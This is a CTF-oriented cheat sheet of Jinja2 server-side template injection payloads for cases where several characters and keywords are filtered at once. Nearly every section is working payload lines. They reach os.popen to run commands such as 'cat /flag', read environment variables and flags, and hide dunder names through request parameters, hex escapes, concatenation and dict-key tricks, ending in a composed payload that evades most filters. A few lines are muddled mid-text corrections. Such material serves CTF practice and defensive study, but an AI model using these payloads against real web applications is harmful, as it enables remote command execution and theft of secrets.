# Advanced reach — the nightmare-filter combos

When MULTIPLE things are filtered at once. The composed bypasses
for the worst cases — no-underscores + no-quotes + no-dots +
no-callables + no-{{}} — the actual hardest CTF shapes.

---

## 1. The no-underscores + no-quotes case

```jinja2
{{''|attr(request.args.a)|attr(request.args.b)|attr(request.args.c)()}}
   &a=__class__&b=__mro__&c=__subclasses__
   — every dunder-string arrives via params — zero literals
{{lipsum|attr(request.args.a)}}
   &a=__globals__
{{lipsum|attr(request.args.g)[request.args.o][request.args.p](request.args.c)[request.args.r]()}}
   &g=__globals__&o=os&p=popen&c=id&r=read
   — the full chain — every token via params
```

## 2. The no-parens case — method-calls without ()

```jinja2
{{config}}                                   — objects render fine
{{config.items}}                              — methods-obj (no call)
{{lipsum.__globals__}}                         — attr-walk — no calls
{{''.__class__.__mro__}}                       — all-attrs — no calls
{{''.__class__.__mro__[1].__subclasses__}}      — subclasses method —
                                                  NEEDS () — fails
{{''.__class__.__mro__[1].__subclasses__()}}    — the () is required!
{{config.from_pyfile}}                          — method-obj — no call
{{config.from_pyfile('/flag')}}                 — needs () — fails
   — when () dies: only attr-READS survive — no method-calls —
     read-side only: config/env/context — still often enough:
{{config.items}} {{self._TemplateReference__context}} {{request.environ}}
   — the __subclasses__ CALL is the blocker — pivot to bound-fns:
{{lipsum.__globals__.os.environ}}                — environ — NO calls!
{{lipsum.__globals__.os.popen}}                   — method-obj — no call
   — os.environ needs ZERO parens — env-read survives no-() filters
```

`os.environ` — the highest-value no-`()` read — flag-vars without
a single paren.

## 3. The no-dots case — bracket-only reach

```jinja2
{{''['__class__']['__mro__'][1]['__subclasses__']()}}
{{lipsum['__globals__']['os']['popen']('id')['read']()}}
{{lipsum['__globals__']['os']['environ']}}
{{lipsum['__globals__']['os']['environ']['FLAG']}}
{{self['__init__']['__globals__']['os']['environ']}}
{{config['from_pyfile']('/flag')}}
{{config['items']()}}
{{request['environ']}}
{{request['application']['__globals__']['os']['environ']}}
{{''['__class__']['__mro__'][1]['__subclasses__']()|selectattr('__name__','equalto','Popen')|first}}
```

`['x']` substitutes for `.x` everywhere — dict-items AND object-
attrs both — one uniform accessor.

## 4. The no-keywords case — `class`/`import`/`os`/`eval` filtered

```jinja2
{{''|attr('__cl'+'ass__')}}                      — concat-split
{{''|attr('__c'+'lass__')}}
{{''|attr('\x5f\x5fclass\x5f\x5f')}}               — hex-bytes
{{''|attr('__\x63lass__')}}                         — partial-hex
{{''|attr(request.args.a)}}&a=__class__            — param-carried
{{lipsum|attr(request.args.a)}}&a=__globals__
{{lipsum['__globals__']['o'+'s']}}
{{lipsum['__globals__']['o'+'s']['po'+'pen']}}
{{lipsum['__globals__']['os'][dict(po=v)|first+'pen']}}  — dict-key+
                                                         concat!
{{x|attr('\x5f\x5fclass\x5f\x5f')}}
{{x|attr('\x5f\x5f\x67\x6c\x6f\x62\x61\x6c\x73\x5f\x5f')}}   — __globals__
{{x|attr('\x5f\x5f\x69\x6e\x69\x74\x5f\x5f')}}              — __init__
{{x|attr('\x5f\x5f\x62\x75\x69\x6c\x74\x69\x6e\x73\x5f\x5f')}}  — builtins
{{x|attr('\x5f\x5f\x73\x75\x62\x63\x6c\x61\x73\x73\x65\x73\x5f\x5f')}}  — subclasses
{{x|attr('\x5f\x5f\x67\x65\x74\x69\x74\x65\x6d\x5f\x5f')}}    — __getitem__
{{x|attr('\x5f\x5f\x6d\x72\x6f\x5f\x5f')}}                  — __mro__
{{x|attr('\x5f\x5f\x62\x61\x73\x65\x5f\x5f')}}               — __base__
{{x|attr('\x5f\x5f\x69\x6d\x70\x6f\x72\x74\x5f\x5f')}}       — __import__
{{x|attr('\x5f\x5f\x64\x69\x63\x74\x5f\x5f')}}               — __dict__
```

The `\xNN` hex-escape — Jinja parses it inside string-literals —
`'\x5f\x5fclass\x5f\x5f'` == `'__class__'` — the whole dunder can
be hexed.

## 5. The no-brackets case — `[`/`]` blocked

```jinja2
{{x.__class__.__mro__.__getitem__(1)}}              — index via method
{{x.__class__.__mro__.__getitem__(1).__subclasses__()}}
{{x.__globals__.__getitem__('os')}}
{{x.__globals__.get('os')}}                          — .get — cleanest
{{lipsum.__globals__.get('os').environ}}
{{lipsum.__globals__.get('os').popen('id').read()}}
{{config.get('FLAG')}}
{{request.cookies.get('x')}}
{{request.headers.get('x')}}
{{request.args.get('x')}}
{{x.__dict__}}                                       — dict direct —
                                                        no index needed
{{_context}}                                          — the ctx — direct
{{_context|join}} {{_context|list}}
{{x.__class__.__mro__|first}}
{{x.__class__.__mro__|last}}
{{x.__class__.__mro__|list}}
{{x.__class__.__mro__|list|first}}
{{x.__class__.__mro__|selectattr|list}}
   — |first/|last/|list select without indexing
```

`.get('x')`/`.__getitem__('x')`/`|first`/`|last`/`|list` — index-free
accessors for both dicts and sequences.

## 6. The no-letters case — extreme charset-filter

```jinja2
{{x|attr('\x5f\x5fclass\x5f\x5f')}}                  — hex has NO
                                                     letters 'clas'
{{x|attr('\x5f\x5f\x63\x6c\x61\x73\x73\x5f\x5f')}}    — all-hex — zero
                                                        ascii-letters!
{{dict(__class__=v)|first}}                           — 'class' still
                                                        literal — hex it:
{{dict(\x5f\x5fclass\x5f\x5f=v)|first}}                — can't hex a kwarg!
   → kwargs need real names — use |attr + hex-string instead
{{'%c%c%c%c%c%c%c%c'|format(95,95,99,108,97,115,115)}}
   — '%c'|format(N) = chr(N) — digits+format — '__class__' built
   from pure numbers — NO letters in the literal
```

## 7. The `{% %}`-only + no-underscores combo

```jinja2
{%set k='__cl'+'ass__'%}{%set x=lipsum[k]%}...
   — wait — 'class' written but split → 'class' filtered?
   → build via request.args:
{%set k=request.args.k%}{%set v=lipsum[k]%}{{v}}
   &k=__class__ → lipsum['__class__'] — k never literal
{%set g=request.args.g%}{%set o=request.args.o%}
{%set p=request.args.p%}{%set c=request.args.c%}
{%set r=request.args.r%}
{%set f=lipsum[g][o][p]%}{%set x=f(c)[r]%}
   &g=__globals__&o=os&p=popen&c=cat%20/flag&r=read
   — ALL tokens via params — the template-literal has zero
     dangerous strings — works even with {}-only + all-filters
```

## 8. The `|`only-filters case — some chars filtered mid-payload

```jinja2
{{x|attr('__class__')|attr('__mro__')|attr('__subclasses__')()|attr('__getitem__')(N)}}
{{lipsum|attr('__globals__')|attr('__getitem__')('os')|attr('popen')('id')|attr('read')()}}
{{lipsum|attr('__globals__')|attr('get')('os')|attr('environ')}}
{{lipsum|attr('__globals__')|attr('get')('os')|attr('getenv')('FLAG')}}
{{lipsum|attr('__globals__')|attr('get')('os')|attr('environ')|attr('get')('FLAG')}}
   — nested |attr for method-call chains — popen → method-obj,
     then ('id') the call — parens still needed for calls —
     use .get/.environ for no-paren reads
```

## 9. The `.`-in-string trick — dots INSIDE quoted strings survive

```jinja2
{{'__class__'.strip()}}                     — '.' on the STRING is
                                              a call — works
{{x.__class__}}                              — '.' on the object —
                                              the filter target —
                                              if blocked → brackets
{{'__class__'|attr}}                          — the attr-FILTER —
                                              getattr-equiv
{{'x.y'|attr}}                               — no — attr takes name
                                              not path
{{x['__class__']['__mro__']}}                  — brackets — when
                                              literal-.-filtered
```

The filter targets the `.` in template-code — `'.'` inside a
quoted string isn't parsed as accessor — survives.

## 10. The `__`-inside-string trick — same idea

```jinja2
{{'__class__'}}                             — dunder in a string —
                                              literal — survives
                                              only if filter checks
                                              code-context not raw-bytes
{{x.__class__}}                              — dunder in code — the
                                              filter target
{{x['__class__']}}                           — dunder in brackets —
                                              code-adjacent — some
                                              filters catch, some don't
{{x|attr('__class__')}}                       — dunder in filter-arg —
                                              another context
{{dict(__class__=x)|first}}                    — dunder as kwarg —
                                              different surface
{{x|attr('\x5f\x5fclass\x5f\x5f')}}             — hex — the dunder
                                                never literal
```

Six spellings of the same access — the filter's context-awareness
decides which survive — enumerate all six in one batch.

## 11. The `__` via `dict`+join trick

```jinja2
{{dict(__class__=v)|first}}                    — '__class__' literal —
                                                  filtered literally?
{{dict(cl=v)|first + dict(ass=v)|first}}          — split-kwargs! —
                                                  'cl'+'ass' — but
                                                  wait — dict(cl=v) has
                                                  'cl' as key — |first
                                                  gives 'cl' — + 'ass' —
                                                  __cl + ass__ wrong —
                                                  need the __ split:
{{dict(_=v)|first + dict(_=v)|first + dict(class=v)|first}}
   — '_'+'_'+'class' → '__class' — wrong — we want the FULL dunder:
{{dict(_=v)|first * 2 + dict(class=v)|first + dict(_=v)|first * 2}}
   — '__' + 'class' + '__' → '__class__' — string-mul + concat —
   — the keys are filter-clean ('_', 'class' — no '__')
   → then feed it to attr:
{{x|attr(dict(_=v)|first * 2 + dict(class=v)|first + dict(_=v)|first * 2)}}
```

The dict-key trick — `dict(_=v)` → key `'_'` — `|first` extracts
it → `*2` doubles → `+` joins → '__class__' built without a single
filtered char.

## 12. The composed worst-case payload — the reference impl

```jinja2
{{lipsum|attr(request.args.g)|attr(request.args.o)|attr(request.args.p)(request.args.c)|attr(request.args.r)()}}
   &g=__globals__&o=__getitem__&p=os ... wait — __getitem__ is a
   dunder too — carry it in params:
{{lipsum|attr(request.args.g)|attr(request.args.d)(request.args.o)|attr(request.args.p)(request.args.c)|attr(request.args.r)()}}
   &g=__globals__&d=__getitem__&o=os&p=popen&c=cat%20/flag&r=read
   → lipsum.__globals__['os'].popen('cat /flag').read()
   — every identifier via params — the template has zero literals
     beyond 'lipsum' 'attr' 'request.args' and delimiters
```

The carrier-suffix carries the WHOLE payload — if `request.args`
itself is bound and `|attr` works — this survives almost any
keyword-filter.
